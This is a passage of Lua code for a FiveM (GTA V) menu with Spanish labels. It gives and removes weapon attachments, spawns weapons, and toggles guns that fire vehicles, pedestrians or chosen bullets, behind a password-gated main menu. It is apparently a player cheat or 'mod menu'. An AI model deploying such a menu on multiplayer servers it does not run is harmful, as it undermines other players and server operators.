                elseif Cience.Button("~g~Añadir supresor") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif Cience.Button("~r~Quitar supresor") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif Cience.Button("~g~Añadir mira") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                elseif Cience.Button("~r~Quitar mira") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                end					

                Cience.Display()
            elseif Cience.IsMenuOpened("BulletGunMenu") then
                if Cience.CheckBox(
                    "Arma de coches",
                    vehicleGun,
                    function(enabled)
                        vehicleGun = enabled
                    end)
                then
                elseif Cience.ComboBox("Vehículo por disparo", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                    currentVehicle = currentIndex
                    selectedVehicle = selectedIndex

                end) 
                then
                elseif Cience.ComboBox("Velocidad de Vehiculo", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                    currentVehicleSpeed = currentIndex
                    selectedVehicleSpeed = selectedIndex
                end) 
                then
                elseif Cience.CheckBox(
                    "Pistola de PED",
                    pedGun,
                    function(enabled)
                        pedGun = enabled
                end)
                then
                elseif Cience.ComboBox("Ped por disparar", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                    currentPed = currentIndex
                    selectedPed = selectedIndex
                end)
                then
                elseif Cience.CheckBox(
                    "Pistola de bala",
                    bulletGun,
                    function(enabled)
                        bulletGun = enabled
                    end)
                then
                elseif Cience.ComboBox("Bala", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                    currentBullet = currentIndex
                    selectedBullet = selectedIndex
                    end)
                then
                end


                

                Cience.Display()
            elseif Cience.IsMenuOpened("SingleWeaponMenu") then
                for i = 1, #allWeapons do
                    if Cience.Button(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
                end
                    
                Cience.Display()
            elseif IsDisabledControlPressed(0, 314) then
                if logged then
                    Cience.OpenMenu("MainMenu")
                else
                    local temp = KeyboardInput("Añade la Contraseña", "", 100)
                    if temp == pass then
                        drawNotification("~g~Logeado correctamente! Bienvenido Compadre")
                        logged = true
                        Cience.OpenMenu("MainMenu")
                        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    else
                        drawNotification("~r~Logeo fallado! Tu eres tonto o algo?")
                    end
                end
            end

            Citizen.Wait(0)
        end
    end)